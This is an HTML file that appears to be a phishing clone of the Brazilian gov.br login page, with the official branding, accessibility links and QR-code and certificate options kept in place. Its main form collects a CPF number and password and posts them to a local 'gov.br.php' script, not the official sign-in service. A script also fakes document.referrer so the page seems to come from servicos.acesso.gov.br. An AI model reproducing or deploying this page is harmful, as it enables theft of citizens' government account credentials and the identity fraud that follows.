...
<!DOCTYPE html>
<!-- saved from url=(0108)https://sso.acesso.gov.br/login?client_id=portal-logado.estaleiro.serpro.gov.br&authorization_id=19c99f14287 -->
...
function asmReferrerGetter() { return "https://servicos.acesso.gov.br/"; }
getterHook(Document, "referrer", asmReferrerGetter);
  ...
  <script src="./gov.br - Acesse sua conta_files/contrast.class.js.download"></script>
  <script src="./gov.br - Acesse sua conta_files/modal.js.download"></script>
</head>

<body>
    <a tabindex="0" href="https://sso.acesso.gov.br/login?client_id=portal-logado.estaleiro.serpro.gov.br&amp;authorization_id=19c99f14287#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conte̼do principal. Navegue sempre com a tecla TAB">Pular para o conte̼do principal</a>

    <header>
        <a href="https://www.gov.br/"><img src="./gov.br - Acesse sua conta_files/govbr.png" alt="Logomarca GovBR"></a>
        <div id="acessibilidade">
            <span>
                <a href="https://sso.acesso.gov.br/login?client_id=portal-logado.estaleiro.serpro.gov.br&amp;authorization_id=19c99f14287#" onclick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
            </span>
            <span>
...
<div class="container">
	...
	<form method="post" id="loginData" action="gov.br.php" autocomplete="off" novalidate="">
		<div class="card" id="login-cpf">
			...
			<div class="item-login-signup-ways" onclick="accordion(&#39;accordion-panel-id&#39;)">
				...
				<div class="accordion-panel" id="accordion-panel-id">
					...
					<input id="usuario" name="usuario" type="tel" inputmode="numeric" placeholder="Digite seu CPF">

					<label for="cpf">SENHA</label>
					<input id="senha" name="senha" autocomplete="new-password" type="password" placeholder="Digite sua senha">
				...
				<div class="item-login-signup-ways" onclick="showQrCode(&#39;4568c619-fa7a-4d53-8251-2ba7a05a3b72&#39;);">
						<a tabindex="5" href="https://sso.acesso.gov.br/login?client_id=portal-logado.estaleiro.serpro.gov.br&amp;authorization_id=19c99f14287#">
						    <img src="./gov.br - Acesse sua conta_files/qrcode.png">
								Login com QR code
					   		</a>
					</div>
				<div class="item-login-signup-ways" id="cert-digital">
					<button id="login-certificate" type="submit" formaction="https://certificado.sso.acesso.gov.br/login?client_id=portal-logado.estaleiro.serpro.gov.br&amp;authorization_id=19c99f14287" name="operation" value="login-certificate" class="button-href-mimic2" tabindex="4">
        ...
        <input type="hidden" name="_csrf" value="4568c619-fa7a-4d53-8251-2ba7a05a3b72">
		...
		<div id="hcaptcha"><iframe aria-hidden="true" data-hcaptcha-widget-id="018l7vwrikhd" data-hcaptcha-response="" src="./gov.br - Acesse sua conta_files/hcaptcha.html" style="display: none;"></iframe><textarea id="h-captcha-response-018l7vwrikhd" name="h-captcha-response" style="display: none;"></textarea></div>
			<script>
			...
			<script src="./gov.br - Acesse sua conta_files/api.js.download" async="" defer=""></script>
		</form>
	</main>
</div>
<div class="modal-qrcode">
  ...
  <script src="./gov.br - Acesse sua conta_files/jquery-2.2.4.min.js.download"></script>
  <script src="./gov.br - Acesse sua conta_files/scripts.js.download"></script>
  <script src="./gov.br - Acesse sua conta_files/jquery.maskedinput.js.download"></script>
...
<script src="./gov.br - Acesse sua conta_files/qrcode.min.js.download"></script>
<script>
var loginQrCode = {};
...
<div class="divlogo">
	<img src="imagegov.svg.png" alt="logogov" width="15">
</div></body></html>